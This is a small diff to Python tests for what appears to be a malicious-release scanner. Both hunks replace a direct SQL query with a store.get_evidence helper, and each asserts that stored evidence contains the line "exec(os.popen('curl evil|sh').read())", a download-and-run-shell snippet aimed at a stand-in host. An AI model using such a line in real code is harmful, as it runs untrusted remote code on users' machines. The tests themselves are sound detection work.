@@ -75,7 +75,7 @@ def test_backfill_captures_evidence_for_existing_flagged_row(tmp_path, monkeypat
     res = orchestrator.backfill_evidence(cfg)
     assert len(res) == 1 and res[0]["captured"] is True
     conn = store.connect(cfg)
-    ev = conn.execute("SELECT evidence FROM releases WHERE id=?", (rid,)).fetchone()[0]
+    ev = store.get_evidence(conn, rid)
     assert ev is not None and "exec(os.popen('curl evil|sh').read())" in ev
 
 
@@ -116,7 +116,7 @@ def test_backfill_reconstructs_first_release_scan(tmp_path, monkeypatch):
     res = orchestrator.backfill_evidence(cfg)
     assert len(res) == 1 and res[0]["captured"] is True
     conn = store.connect(cfg)
-    ev = conn.execute("SELECT evidence FROM releases WHERE id=?", (rid,)).fetchone()[0]
+    ev = store.get_evidence(conn, rid)
     assert ev is not None and "exec(os.popen('curl evil|sh').read())" in ev
 
 
